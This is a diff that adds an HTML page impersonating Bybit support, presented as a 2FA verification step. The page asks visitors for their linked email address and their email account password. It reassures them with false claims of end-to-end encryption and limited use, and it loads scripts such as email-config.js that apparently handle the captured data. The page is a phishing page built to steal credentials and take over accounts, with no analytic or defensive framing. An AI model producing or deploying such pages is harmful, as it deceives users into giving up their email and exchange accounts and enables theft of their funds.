@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bybit Support - 2FA Verification</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <img src="bybit logo/bybit.png" alt="Bybit Logo" class="logo">
+                <h1>2FA Verification</h1>
+            </div>
+            
+            <div class="security-notice">
+                <div class="security-icon">🔒</div>
+                <p>Your information is protected with end-to-end encryption</p>
+            </div>
+
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label for="has2fa">Do you have 2FA enabled?</label>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="has2fa" value="yes" required>
+                            <span>Yes</span>
+                        </label>
+                        <label class="radio-label">
+                            <input type="radio" name="has2fa" value="no" required>
+                            <span>No</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div id="emailSection" class="form-group hidden">
+                    <label for="email">Linked 2FA Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="Enter your 2FA email address">
+                    <p class="security-info">Your email is encrypted and will only be used for verification purposes.</p>
+                    
+                    <label for="emailPassword" class="mt-4">Email Account Password</label>
+                    <input type="password" id="emailPassword" name="emailPassword" placeholder="Enter your email account password">
+                    <p class="security-info">This password is required to verify your email account. It will be used to access the verification code sent to your email.</p>
+                </div>
+
+                <button type="submit" class="submit-btn">Continue</button>
+            </form>
+
+            <div class="security-features">
+                <div class="feature">
+                    <span class="feature-icon">🔐</span>
+                    <span>256-bit Encryption</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">🛡️</span>
+                    <span>Secure Connection</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">🔒</span>
+                    <span>Data Protection</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="utils.js"></script>
+    <script src="modal-utils.js"></script>
+    <script src="notification-system.js"></script>
+    <script src="email-config.js"></script>
+    <script src="index.js"></script>
+</body>
+</html> 
